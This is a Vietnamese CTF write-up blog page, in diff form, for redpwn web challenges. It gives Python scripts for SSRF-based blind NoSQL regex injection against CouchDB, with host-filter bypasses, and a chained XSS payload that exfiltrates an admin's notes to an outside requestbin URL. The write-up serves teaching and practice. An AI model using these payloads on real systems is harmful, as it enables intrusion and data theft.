+      <span class="nc">Main</span><span class="o">.</span><span class="na">db</span><span class="o">.</span><span class="na">createUser</span><span class="o">(</span><span class="n">username</span><span class="o">,</span> <span class="n">password</span><span class="o">);</span>
+      <span class="nc">Main</span><span class="o">.</span><span class="na">db</span><span class="o">.</span><span class="na">addUserToDatabase</span><span class="o">(</span><span class="n">username</span><span class="o">,</span> <span class="n">username</span><span class="o">);</span>
+      <span class="nc">JSONObject</span> <span class="n">flagDoc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JSONObject</span><span class="o">();</span>
+      <span class="n">flagDoc</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"flag"</span><span class="o">,</span> <span class="nc">Main</span><span class="o">.</span><span class="na">flag</span><span class="o">);</span>
+      <span class="nc">Main</span><span class="o">.</span><span class="na">db</span><span class="o">.</span><span class="na">insertDocumentToDatabase</span><span class="o">(</span><span class="n">username</span><span class="o">,</span> <span class="n">flagDoc</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+      <span class="n">ctx</span><span class="o">.</span><span class="na">result</span><span class="o">(</span><span class="s">"success"</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nf">InternalServerErrorResponse</span><span class="o">(</span><span class="s">"Something went wrong"</span><span class="o">);</span>
+    <span class="o">}</span> 
+  <span class="o">}</span>
+</code></pre></div></div>
+<p>Folow code nào này sẽ như sau: nhận tham số username và password sau đó gọi 4 fucntion nằm trong class Database là <code class="language-plaintext highlighter-rouge">createDatabase</code>, <code class="language-plaintext highlighter-rouge">createUser</code>, <code class="language-plaintext highlighter-rouge">addUserToDatabase</code>, <code class="language-plaintext highlighter-rouge">insertDocumentToDatabase</code>.
+Để hiểu rõ follow các function trên thì các bạn có thể mở code lên đọc tìm hiểu từ từ, ở đây mình chỉ nói qua là ở router <code class="language-plaintext highlighter-rouge">/createUser</code> này sẽ có nhiệm vụ tạo database name là username của bạn nhập vào, tạo user với username và password sau đó add flag vào account mình tạo (có nghĩa là sau khi tạo account thì flag sẽ nằm trong account của mình) và flag nằm ở cột là <code class="language-plaintext highlighter-rouge">flag</code>.
+Router <code class="language-plaintext highlighter-rouge">/testAPI</code> gọi đến function <code class="language-plaintext highlighter-rouge">testAPI</code> ở class Handlers</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">ctx</span><span class="o">.</span><span class="na">queryParam</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">get</span><span class="o">();</span>
+    <span class="nc">String</span> <span class="n">method</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">ctx</span><span class="o">.</span><span class="na">queryParam</span><span class="o">(</span><span class="s">"method"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">get</span><span class="o">();</span>
+    <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">queryParam</span><span class="o">(</span><span class="s">"data"</span><span class="o">);</span>
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="no">URL</span> <span class="n">urlURI</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+      <span class="k">if</span> <span class="o">(</span><span class="n">urlURI</span><span class="o">.</span><span class="na">getHost</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"couchdb"</span><span class="o">))</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">ForbiddenResponse</span><span class="o">(</span><span class="s">"Illegal!"</span><span class="o">);</span> 
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nf">BadRequestResponse</span><span class="o">(</span><span class="s">"Input URL is malformed"</span><span class="o">);</span>
+    <span class="o">}</span> 
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="k">if</span> <span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">))</span> <span class="o">{</span>
+        <span class="nc">JSONObject</span> <span class="n">jsonObj</span> <span class="o">=</span> <span class="nc">HttpClient</span><span class="o">.</span><span class="na">getAPI</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">jsonObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+      <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">))</span> <span class="o">{</span>
+        <span class="nc">JSONObject</span> <span class="n">jsonObj</span> <span class="o">=</span> <span class="nc">HttpClient</span><span class="o">.</span><span class="na">postAPI</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">stringJsonObj</span> <span class="o">=</span> <span class="n">jsonObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nc">Utils</span><span class="o">.</span><span class="na">containsFlag</span><span class="o">(</span><span class="n">stringJsonObj</span><span class="o">))</span>
+          <span class="k">throw</span> <span class="k">new</span> <span class="nf">ForbiddenResponse</span><span class="o">(</span><span class="s">"Illegal!"</span><span class="o">);</span> 
+      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">BadRequestResponse</span><span class="o">(</span><span class="s">"Request method is not accepted"</span><span class="o">);</span>
+      <span class="o">}</span> 
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nf">InternalServerErrorResponse</span><span class="o">(</span><span class="s">"Something went wrong"</span><span class="o">);</span>
+    <span class="o">}</span> 
+    <span class="n">ctx</span><span class="o">.</span><span class="na">result</span><span class="o">(</span><span class="s">"success"</span><span class="o">);</span>
+  <span class="o">}</span>
+</code></pre></div></div>
+<p>Ở router này thì nhận vào url và method, url phải hợp lệ và không được chứa <code class="language-plaintext highlighter-rouge">couchdb</code>, method thì có 2 lựa chọn là GET và POST. Điều chú ý là khi request lên với url thì nó sẽ chỉ rertun về cho chúng ta là success hoặc mấy throw chứ không trả về reponse content cho mình. Mà ở method POST thì nếu như reponse có chứa full flag thì trả về <code class="language-plaintext highlighter-rouge">Illegal!</code>.</p>
+
+<h3 id="solution-5">Solution</h3>
+<p>Thì đầu tiên ở đây chúng ta cần bypass được đoạn <code class="language-plaintext highlighter-rouge">urlURI.getHost().contains("couchdb")</code> và được biết flag được lưu trong couchdb nên vô docs của couchdb đọc và tìm thấy API <code class="language-plaintext highlighter-rouge">{db}/_find</code> <a href="https://docs.couchdb.org/en/stable/api/database/find.html">document</a> =&gt; chúng ta có thể sử dụng <code class="language-plaintext highlighter-rouge">selector </code> và regex để blind (nosql injection)</p>
+<ul>
+  <li>Để bypass <code class="language-plaintext highlighter-rouge">couchdb</code> thì do hàm <code class="language-plaintext highlighter-rouge">.contains</code> chỉ đúng khi chuỗi đưa vào đúng 100% với chuỗi lọc =&gt; chúng ta chỉ cần thay một kí tự in ra trong couchdb thì có thế bypass.</li>
+  <li>Dùng regex để blind các kí tự có trong flag. Nếu như kí tự đó đúng thì sẽ trả về 500.</li>
+</ul>
+
+<h3 id="payload-4">Payload</h3>
+<p>Step 1: tạo user thông qua <code class="language-plaintext highlighter-rouge">createUser</code> -&gt; <code class="language-plaintext highlighter-rouge">https://requester.mc.ax/createUser?username=rtinfew&amp;password=rtinfew</code>
+Step 2: Mình đã viết 1 đoạn script để thực hiện việc blind này.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://requester.mc.ax/testAPI'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="o">+</span><span class="s">'{}_'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">temp</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">char</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"url"</span><span class="p">:</span><span class="s">"http://rtinfew1:rtinfew1@Couchdb:5984/rtinfew1/_find"</span><span class="p">,</span><span class="s">"method"</span><span class="p">:</span><span class="s">"POST"</span><span class="p">,</span><span class="s">"data"</span><span class="p">:</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"selector"</span><span class="p">:{</span><span class="s">"flag"</span><span class="p">:{</span><span class="s">"$regex"</span><span class="p">:</span><span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">temp</span><span class="si">}</span><span class="s">"</span><span class="p">}}})}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+        <span class="c1"># print(r.text)
+</span>        <span class="k">if</span> <span class="s">"Something went wrong"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<p>Flag -&gt; <code class="language-plaintext highlighter-rouge">flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}</code></p>
+
+<h2 id="challenge-requester-strikes-back">Challenge requester-strikes-back</h2>
+<p>Ở chall này thì follow code vẫn giống như bài Requester. Chỉ có một đoạn chỗ check host là được thay đổi và cách bypass của mình đã sài ở chall Requester không sài được ở bài này.</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span><span class="n">urlURI</span><span class="o">.</span><span class="na">getHost</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"couchdb"</span><span class="o">))</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">ForbiddenResponse</span><span class="o">(</span><span class="s">"Illegal!"</span><span class="o">);</span> 
+      <span class="nc">String</span> <span class="n">urlDecoded</span> <span class="o">=</span> <span class="nc">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
+      <span class="n">urlURI</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="n">urlDecoded</span><span class="o">);</span>
+      <span class="k">if</span> <span class="o">(</span><span class="n">urlURI</span><span class="o">.</span><span class="na">getHost</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"couchdb"</span><span class="o">))</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">ForbiddenResponse</span><span class="o">(</span><span class="s">"Illegal!"</span><span class="o">);</span> 
+</code></pre></div></div>
+<p>-&gt; Lần này thì sẽ toLowerCase sau đó mới check, cũng như là chhặn luôn viện sử dụng unicode.
+Vì ở chall Requester mình stuck khá lâu nên mình cứ nghĩ là sai ở chỗ check host nên mình cứ chăm chăm vào đó và thành ra tìm được cách vượt được check host của bài này luôn :)).</p>
+
+<h3 id="solution-6">Solution</h3>
+<p>Sử dụng %00 để bypass check host còn phần sau vẫn như bài trước.</p>
+
+<h3 id="payload-5">Payload</h3>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://requester-strikes-back.mc.ax//testAPI'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="o">+</span><span class="s">'{}_'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">temp</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">char</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"url"</span><span class="p">:</span><span class="s">"http://rtinfew1:rtinfew1@couchdb%00@cc:5984//rtinfew1/_find"</span><span class="p">,</span><span class="s">"method"</span><span class="p">:</span><span class="s">"POST"</span><span class="p">,</span><span class="s">"data"</span><span class="p">:</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"selector"</span><span class="p">:{</span><span class="s">"flag"</span><span class="p">:{</span><span class="s">"$regex"</span><span class="p">:</span><span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">temp</span><span class="si">}</span><span class="s">"</span><span class="p">}}})}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+        <span class="c1"># print(r.text)
+</span>        <span class="k">if</span> <span class="s">"Something went wrong"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<ul>
+  <li>Mình cũng thấy có một số payload được các bạn share lên như <code class="language-plaintext highlighter-rouge">@%63ouchdb%3a5984@lol</code></li>
+</ul>
+
+<h2 id="challenge-notes">Challenge notes</h2>
+<p>Mình sẽ không phân tích code từng đoạn một mà sẽ nói sơ qua follow code của bài này và chỗ exploit nhé. Chương trình có phần register và login nhưng các đoạn đó chỉ là code bình thường và mình không phát hiện lỗi trong đó.
+Có 3 router chính là <code class="language-plaintext highlighter-rouge">/api/notes</code>, <code class="language-plaintext highlighter-rouge">api/notes/}${user}</code> và <code class="language-plaintext highlighter-rouge">/view/${user}</code>
+File <code class="language-plaintext highlighter-rouge">modules/api-plugin.js</code></p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">32</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">addNote</span><span class="p">(</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+  <span class="na">body</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">,</span>
+  <span class="na">tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">private</span><span class="dl">'</span><span class="p">,</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>Đoạn code trên thì chúng ta có thể thấy được flag nằm trong body của account admin.
+File <code class="language-plaintext highlighter-rouge">view/index.js</code></p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">note</span> <span class="k">of</span> <span class="nx">notes</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// this one is controlled by user, so prevent xss</span>
+    <span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">note</span><span class="p">.</span><span class="nx">body</span>
+      <span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;lt;</span><span class="dl">'</span><span class="p">)</span>
+      <span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">&gt;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;gt;</span><span class="dl">'</span><span class="p">)</span>
+      <span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;quot;</span><span class="dl">'</span><span class="p">)</span>
+      <span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;#39;</span><span class="dl">'</span><span class="p">);</span>
+    <span class="c1">// this one isn't, but make sure it fits on page</span>
+    <span class="kd">const</span> <span class="nx">tag</span> <span class="o">=</span>
+      <span class="nx">note</span><span class="p">.</span><span class="nx">tag</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="p">?</span> <span class="nx">note</span><span class="p">.</span><span class="nx">tag</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">...</span><span class="dl">'</span> <span class="p">:</span> <span class="nx">note</span><span class="p">.</span><span class="nx">tag</span><span class="p">;</span>
+    <span class="c1">// render templates and put them in our array</span>
+    <span class="kd">const</span> <span class="nx">rendered</span> <span class="o">=</span> <span class="nx">populateTemplate</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="p">{</span> <span class="nx">body</span><span class="p">,</span> <span class="nx">tag</span> <span class="p">});</span>
+    <span class="nx">renderedNotes</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">rendered</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+<p>Đoạn code trên là sau khi nhận tham số <code class="language-plaintext highlighter-rouge">body</code> và <code class="language-plaintext highlighter-rouge">tag</code>. Ở body nếu có chứa các <code class="language-plaintext highlighter-rouge">&lt;&gt;"'</code> thì sẽ bị replace với các HTML entities tương ứng. tag thì không bị filter nhưng bị check length, không được vượt quá 10, nếu &gt; 10 thì chỉ lấy 7 kí tự và cộng thêm …</p>
+
+<h3 id="solution-7">Solution</h3>
+<ul>
+  <li>Như ở trên đã phân tích thì chỉ ở body mới bị replace các dấu có thể xss còn tag thì không =&gt; dựa vô tag để xây dựng payload xss.</li>
+  <li>Nhưng tag không thể vượt 10 kí tự nên không thể viết payload xss 1 lần vô tag luôn mà chúng ta phải chain các tag lại với nhau thành 1 payload xss tưng ứng (mỗi lần gửi length tag sẽ nhỏ &lt;= 10).</li>
+  <li>flag ở body của admin nên chúng ta cần fetch tới <code class="language-plaintext highlighter-rouge">/api/notes/admin</code> để đọc flag.</li>
+  <li>Cuối cùng gửi <code class="language-plaintext highlighter-rouge">/view/$user</code> cho bot visit.</li>
+</ul>
+
+<h3 id="payload-6">Payload</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">tag</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">&lt;style a='</span><span class="dl">"</span><span class="p">}</span>
+<span class="p">{</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">tag</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">'onload='`</span><span class="dl">"</span><span class="p">}</span>
+<span class="p">{</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">`;fetch(`/api/notes/admin`).then(r=&gt;r.text()).then(t=&gt;fetch(`https://requestbin.net/r/e34po5o2?cc=`+btoa(t)));`</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">tag</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">`;'/&gt;</span><span class="dl">"</span><span class="p">}</span>
+</code></pre></div></div>
+<p>accout của mình đây là <code class="language-plaintext highlighter-rouge">RTinFew</code> =&gt; gửi link cho bot là <code class="language-plaintext highlighter-rouge">https://notes.mc.ax/view/rtinfew</code>
+Flag -&gt; <code class="language-plaintext highlighter-rouge">flag{w0w_4n07h3r_60lf1n6_ch4ll3n63}</code></p>
+
+<h2 id="lời-kết">Lời kết</h2>
+<p>Qua redpwn lần này mình học thêm được nhiều thứ cũng như có thể ôn luyện lại các kiến thức mình đã có. Cảm ơn các bạn đã đọc, hẹn các bạn ở các CTF tiếp theo :))</p>
+
+  </div>
+
+  <footer class="post-footer">
+    
+      <div class="post-meta">
+        <i class="fas fa-folder"></i>
+        <ul class="post-taxonomies post-categories">
+          
+          
+            <li class="post-category">
+              
+              <a href="/CTF/categories#ctf">CTF</a>
+            </li>
+          
+        </ul>
+      </div>
+    
+
+    
+
+    <nav class="post-pagination" role="navigation">
+      
+        <a class="post-previous" href="/CTF">
+          <h4 class="post-pagination-label">Prev</h4>
+          <span class="post-pagination-title">
+            <i class="fas fa-arrow-left"></i> 
+          </span>
+        </a>
+      
+
+      
+        <a class="post-next" href="/CTF/wg">
+          <h4 class="post-pagination-label">Next</h4>
+          <span class="post-pagination-title">
+            [WRITEUP WARGAME 2021]: WEB
+ <i class="fas fa-arrow-right"></i>
+          </span>
+        </a>
+      
+    </nav>
+  </footer>
+
+  
+  
+</article>
+
+          <footer class="site-footer">
+            <div class="footer-col-wrapper">
+
+  <div class="footer-col">
+    <div class="copyright">
+      
+      
+      
+      
+      <p>Copyright © 2021 Lê Nguyễn Tiến Vinh; All rights reserved.</p>
+      
+    </div>
+  </div>
+
+  <div class="footer-col">
+    <p>Blog security</p>
+  </div>
+</div>
+
+          </footer>
+        </main>
+      </div>
+    </div>
+  </body>
+
+</html>
